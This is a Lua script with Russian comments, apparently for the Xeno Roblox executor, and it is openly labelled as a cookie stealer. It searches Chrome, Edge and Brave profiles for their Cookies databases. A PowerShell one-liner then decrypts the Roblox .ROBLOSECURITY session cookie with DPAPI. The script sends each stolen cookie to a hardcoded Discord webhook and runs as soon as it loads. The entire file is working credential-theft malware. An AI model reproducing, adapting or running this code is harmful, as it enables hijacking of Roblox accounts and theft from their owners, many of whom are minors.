--[========================================================[
    ПРОЕКТ "КРЫСИНЫЙ КОРОЛЬ" - ВЕРСИЯ ДЛЯ XENO
    Архитектор: Твой злой гений
    Статус: ОПТИМИЗИРОВАНО ПОД XENO
]========================================================]

local webhook = "https://discord.com/api/webhooks/1526670985124778135/e114crwp_QTxORK21zp-dT36xCevIT1Hw1huQXPZC9aE-lYSomCX0egkHHYUT1w-QWqT"

-- Функция отправки в Discord через syn.request (без PowerShell!)
local function sendToDiscord(cookie, browser, profile)
    local embed = {
        title = "🚬 НАЛОГ СОБРАН - XENO EDITION",
        description = "**Время:** " .. os.date("%Y-%m-%d %H:%M:%S"),
        color = 0x8B0000,
        fields = {
            {
                name = "🥀 Кука (.ROBLOSECURITY)",
                value = "```" .. cookie .. "```",
                inline = false
            },
            {
                name = "📋 Браузер / Профиль",
                value = "```" .. browser .. " / " .. profile .. "```",
                inline = false
            }
        },
        footer = {
            text = "Baldyrex IRS - Xeno Division"
        }
    }
    
    local payload = game:GetService("HttpService"):JSONEncode({embeds = {embed}})
    
    -- Xeno поддерживает syn.request для ВНЕШНИХ запросов
    if syn and syn.request then
        syn.request({
            Url = webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = payload
        })
    end
end

-- Функция для чтения кук из браузеров через Lua + Xeno
local function stealCookies()
    local browsers = {
        {
            name = "Chrome",
            path = os.getenv("USERPROFILE") .. "\\AppData\\Local\\Google\\Chrome\\User Data"
        },
        {
            name = "Edge",
            path = os.getenv("USERPROFILE") .. "\\AppData\\Local\\Microsoft\\Edge\\User Data"
        },
        {
            name = "Brave",
            path = os.getenv("USERPROFILE") .. "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data"
        }
    }
    
    for _, browser in ipairs(browsers) do
        -- Ищем профили
        local function findProfiles(basePath)
            local profiles = {}
            local handle = io.popen('dir /b /ad "' .. basePath .. '" 2>nul')
            if handle then
                for line in handle:lines() do
                    if line:match("Default") or line:match("Profile") then
                        table.insert(profiles, line)
                    end
                end
                handle:close()
            end
            return profiles
        end
        
        local profiles = findProfiles(browser.path)
        
        for _, profile in ipairs(profiles) do
            -- Путь к файлу Cookies
            local cookiePath = browser.path .. "\\" .. profile .. "\\Network\\Cookies"
            
            -- Проверяем, существует ли файл
            local file = io.open(cookiePath, "rb")
            if file then
                file:close()
                
                -- Копируем в Temp для чтения
                local tempPath = os.getenv("TEMP") .. "\\xeno_cookie_temp.db"
                os.execute('copy /y "' .. cookiePath .. '" "' .. tempPath .. '" >nul')
                
                -- Читаем через PowerShell В ОДНОЙ СТРОКЕ
                local psCmd = 'powershell -Command "$conn = New-Object System.Data.SQLite.SQLiteConnection(\'Data Source=' .. tempPath .. ';Version=3;Read Only=True;\'); $conn.Open(); $cmd = $conn.CreateCommand(); $cmd.CommandText = \'SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE \\\"%roblox%\\\" AND name = \\\".ROBLOSECURITY\\\"\'; $reader = $cmd.ExecuteReader(); while ($reader.Read()) { try { $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($reader.GetValue(2), $null, \'CurrentUser\'); Write-Output ([System.Text.Encoding]::UTF8.GetString($dec)) } catch {} }; $conn.Close(); Remove-Item \\\"' .. tempPath .. '\\\" -Force"'
                
                local handle = io.popen(psCmd)
                if handle then
                    for cookie in handle:lines() do
                        if #cookie > 10 then
                            sendToDiscord(cookie, browser.name, profile)
                        end
                    end
                    handle:close()
                end
            end
        end
    end
end

-- ЗАПУСК
stealCookies()
